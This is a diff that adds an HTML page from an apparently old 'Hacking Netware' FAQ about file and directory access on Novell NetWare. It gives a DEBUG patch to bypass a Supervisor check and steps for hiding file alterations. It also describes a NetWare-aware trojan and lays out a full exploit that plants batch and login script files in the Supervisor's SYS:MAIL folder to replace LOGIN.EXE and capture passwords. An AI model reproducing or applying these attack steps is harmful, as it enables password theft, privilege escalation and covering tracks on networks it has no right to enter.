@@ -1,0 +1,309 @@
+<HTML>
+
+<HEAD>
+
+<TITLE>Hacking Netware - File & Dir. Access</TITLE>
+
+<META NAME="AUTHOR" CONTENT="Al Payne">
+</HEAD>
+
+<BODY>
+
+<H4>Section 03 - File and Directory Access</H4>
+
+<P>
+<A HREF="#section_03_1">03-1. How can I see hidden files and directories?</A>
+
+<P>
+<A HREF="#section_03_2">03-2. How do I defeat the execute-only flag?</A>
+
+<P>
+<A HREF="#section_03_3">03-3. How can I hide my presence after altering files?</A>
+
+<P>
+<A HREF="#section_03_4">03-4. What is a Netware-aware trojan?</A>
+
+<P>
+<A HREF="#section_03_5">03-5. What are Trustee Directory Assignments?</A>
+
+<P>
+<A HREF="#section_03_6">03-6. Are there any default Trustee Assignments that can be exploited?</A>
+
+<P>
+<A HREF="#section_03_7">03-7. What are some general ways to exploit Trustee Rights?</A>
+<HR>
+
+<P>
+Section 03
+<H1>File and Directory Access</H1>
+
+<H3><A NAME="section_03_1"></A>03-1. How can I see hidden files
+and directories?</H3>
+
+<P>
+Instead of a normal DIR command, use NDIR to see hidden files
+and directories. NDIR *.* /S /H will show you just Hidden and
+System files.
+<H3><A NAME="section_03_2"></A>03-2. How do I defeat the execute-only
+flag?</H3>
+
+<P>
+If a file is flagged as execute-only, it can still be opened.
+Open the file with a program that will read in executables, and
+do a Save As to another location. <P>
+
+Also try X-AWAY.EXE to remove this flag since Novell's FLAG.EXE won't. But once again X-AWAY.EXE
+requires Supervisor access.<P>
+
+To disable the check for Supe access in X-AWAY, try the following:<P>
+<TT>
+REN X-AWAY.EXE WORK<BR>
+DEBUG WORK<BR>
+EB84 EB<BR>
+W<BR>
+Q<BR>
+REN QORK X-AWAY.EXE<P>
+</TT>
+Hey presto, anybody can copy X flagged files.  The only catch is you need practically full rights in the directory
+where the X flagged files resides.
+
+<H3><A NAME="section_03_3"></A>03-3. How can I hide my presence
+after altering files?</H3>
+
+<P>
+The best way is to use Filer. Here are the steps for removing
+file alterations -
+<UL>
+<LI>Run Filer or use NDIR and note the attributes of the target
+file, namely the date and owner of the file.
+<LI>Make your changes or access the file.
+<LI>Run Filer or use NDIR and check to see if the attributes have
+changed. If so, change them back to the original settings.
+</UL>
+
+<P>
+While you can hit F1 will in Filer and get all the context-sensitive
+help you need, the quicky way to get where you're going is to
+run Filer in the target file's directory, select Directory Contents,
+highlight the target file and hit enter, select File Options and
+then View/Set File Information.
+<P>
+View and edit to your heart's desire.
+<H3><A NAME="section_03_4"></A>03-4. What is a Netware-aware trojan?
+</H3>
+
+<P>
+A Netware-aware trojan is a program that supposedly does one thing
+but does another instead, and does it using Netware API calls.
+I have never personally encountered one, but here is how they
+would work.
+<UL>
+<LI>Trojan program is placed on a workstation, hopefully on one
+frequented by admins with Supe rights. The trojan program could
+be named something like CHKVOL.COM or VOLINFO.COM, that is a real
+name but with a .COM extension. They would be placed in the workstation's
+path.
+<LI>Once executed, the trojan uses API calls to determine if the
+person is logged in as a Supe equivalent, if not it goes to the
+next step. Otherwise some type of action to breach security is
+performed.
+<LI>The real CHKVOL.EXE or VOLINFO.EXE is ran. The breach of security
+would typically be some type of command-line activity that could
+be performed by system() calls. For example, PROP.EXE could be
+run to build a property and the replacement LOGIN.EXE copied up
+to the server in the SYS:LOGIN directory. Or RW access granted
+to the SYS:SYSTEM directory for a non-Supe user like GUEST.
+</UL>
+
+<P>
+Once activated the trojan could also erase itself since it is
+no longer needed.
+<H3><A NAME="section_03_5"></A>03-5. What are Trustee Directory
+Assignments?</H3>
+
+<P>
+The LAN God has pointed out quite correctly that Trustee Directory
+Assignments are the most misunderstood and misconfigured portion
+of Novell Netware. Typically a secure site should have Read and
+File Scan only in most directories, and should not have any rights
+on the root directory of any volume. Rights assigned via the Trustee
+Directory Assignments filter down the directory tree, so if a
+user has Write access at the root directory, that user has Write
+access in every subdirectory below it (unless explicitly limited
+in a subdirectory down stream).
+<P>
+And these assignments are not located in the bindery, but on each
+volume.
+<P>
+The following is a brief description of Trustees and Trustee Directory
+Assignments cut and pasted from the unofficial comp.os.netware.security
+FAQ:
+<P>
+[quote]
+<BLOCKQUOTE>
+A trustee is any user or group that has been granted access rights
+in a directory. The access rights in Novell NetWare 2 are slightly
+different from the ones in NetWare 3.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+The following is a summary of access rights for NetWare 3.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>S - Supervisory</B>. Any user with supervisory rights in a
+directory will automatically inherit all other rights, regardless
+of whether they have been explicitly granted or not. Supervisor
+equivalent accounts will hold this access right in every directory.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>R - Read</B>. Enables users to read files.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>C - Create</B>. Enables users to create files and directories.
+Unless they also have write access, they will not be able to edit
+files which have been created.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>W - Write</B>. Enables users to make changes to files. Unless
+they also have create access, they may not be able to edit files,
+since the write operation can only be used to extend files (not
+truncate them, which file editors need to do).
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>E - Erase</B>. Enable users to erase files and remove directories.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>M - Modify</B>. Enable users to modify file attributes.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>F - File scan</B>. Enables users to see file and directory
+information. If a user does not have file scan rights, they will
+not see any evidence of such files existing.
+</BLOCKQUOTE>
+
+<BLOCKQUOTE>
+<B>A - Access control</B>. Enable user to change trustee rights.
+They will be able to add other users as trustees, remove trustees,
+and grant/revoke specific rights from users. The only caveat of
+access control is that it is possible for users to remove themselves
+(as trustees) from directories, thus losing all access control.
+In addition to trustees and access rights, there is a concept
+of inherited rights which means that users inherit rights from
+parent directories. For example, if user ALICE has rights [CWEM]
+in a directory, and she has [RF] rights in the parent directory
+then she will have [RCWEMF] rights as a result of the inherited
+rights. This will only work if one of the rights that ALICE has
+in the two directories is granted to a group; if both are granted
+to her, she will lose the rights of the parent.
+</BLOCKQUOTE>
+
+<P>
+[end quote]
+<H3><A NAME="section_03_6"></A>03-6. Are there any default Trustee
+Assignments that can be exploited?</H3>
+
+<P>
+Yes. By default the group EVERYONE has Create rights in SYS:MAIL.
+This means the user (including GUEST) has the ability to write
+files to any subdirectory in SYS:MAIL. The first versions of Netware
+included a simple e-mail package, and every user that is created
+gets a subdirectory in mail with RCWEMF, named after their object
+ID number. One consistent number is the number 1, which is always
+assigned to Supervisor. Here's one way to exploit it:
+<OL>
+<LI>Login as GUEST and change to the SYS:MAIL subdirectory.
+<LI>Type DIR. You will see one subdirectory, the one owned by
+GUEST. Change into that directory (ex. here is C0003043)
+<LI>Type DIR. If there is no file named LOGIN, you can bet there
+may not be one for Supervisor. If there is a default-looking LOGIN
+file, even a zero length file, you cannot proceed.
+<LI>Copy PROP.EXE and LOGIN.EXE (the itsme version) to SYS:MAIL\C0003043
+<LI>Create a batch file (ex. here is BOMB.BAT) with the following
+entries:
+</OL>
+
+<PRE>
+<KBD>         @ECHO OFF
+         FLAG \LOGIN\LOGIN.EXE N &gt; NUL
+         COPY \MAIL\C0003043\LOGIN.EXE \LOGIN\LOGIN.EXE &gt; NUL
+         FLAG \LOGIN\LOGIN.EXE SRO &gt; NUL
+         \MAIL\C0003043\PROP -C &gt; NUL</KBD>
+</PRE>
+
+<OL>
+<LI>Create a LOGIN file with the following entries:
+</OL>
+
+<PRE>
+<KBD>         MAP DISPLAY OFF
+         MAP ERRORS OFF
+         MAP G:=SYS:
+         DRIVE G:
+         COMMAND /C #\MAIL\1\BOMB
+         DRIVE F:
+         MAP DELETE G:</KBD>
+</PRE>
+
+<OL>
+<LI>Now copy the files to the Supervisor's SYS:MAIL directory
+from a drive mapped to the SYS: volume.
+</OL>
+
+<PRE>
+<KBD>         TYPE BOMB.BAT &gt; \MAIL\1\BOMB.BAT
+         TYPE LOGIN &gt; \MAIL\1\LOGIN</KBD>
+</PRE>
+
+<P>
+The next time the Supervisor logs in the LOGIN.EXE is replaced
+and the PROP.EXE file is run, capturing passwords. Run PROP.EXE
+later to get the passwords, and then once you have all the passwords
+you need (including Supervisor) delete your LOGIN and BOMB.BAT
+file.
+<P>
+Admins can defeat this by creating default personal Login Scripts
+or by adding an EXIT command to the end of the System Login Script.
+Later versions of Netware create a zero-length LOGIN file at ID
+creation time in the SYS:MAIL directories to defeat this.
+
+<H3><A NAME="section_03_7"></A>03-7. What are some general ways to exploit Trustee Rights?</H3>
+
+To find out all your trustee rights, use the WHOAMI /R command. The 
+following section is a summary of what rights to expect, and the purpose.
+Where x appears, it means it doesn't matter if the right is set.<P>
+
+<TABLE COLSPEC="L20 L20">
+<TR><TD VALIGN = "TOP">[SRWCEMFA]</TD><TD> means you have FULL rights. They are all eight of the effective
+rights flags.</TD></TR>
+<TR><TD VALIGN = "TOP">[Sxxxxxxx]</TD><TD>shouldn't appear unless you are supervisor (or equivalent).
+It means you have full access in that directory and all subdirectories.
+You cannot be excluded from any directory, even if a user explicitly
+tries to revoke your access in a subdirectory.</TD></TR>
+<TR><TD VALIGN = "TOP">[xxxxxxxA]</TD><TD> is next best thing to the S right. It means you have access 
+control in that directory and all subdirectories. You can have your access control (along with any other rights) revoked in a subdirectory,
+but you can always use inherited rights to recover them (see the 
+c.o.n.s FAQ).</TD></TR>
+<TR><TD VALIGN = "TOP">[ R    F ]</TD><TD> is what users should have in directories containing software.
+You have the right to read files only.</TD></TR>
+<TR><TD VALIGN = "TOP">[ RCWEMFx]</TD><TD> is what users should have in their home directory. You can read,
+create, and edit files. If you find any unusual directories with
+these rights, they can also be used for storing files (maybe an abuse
+of the network, especially if this is exploited to avoid quota
+systems).</TD></TR>
+<TR><TD VALIGN = "TOP">[ RxW  F ]</TD><TD> usually means that the directory is used for keeping log files.
+Unless you have the C right, it may not be possible to edit files in
+this directory.</TD></TR>
+</TABLE><P>
+The RIGHTS commands tells you what rights you have in a particular directory.
+GRANT, REVOKE, and REMOVE are used to set trustee rights.
+<HR>
+</BODY>
+
+</HTML>
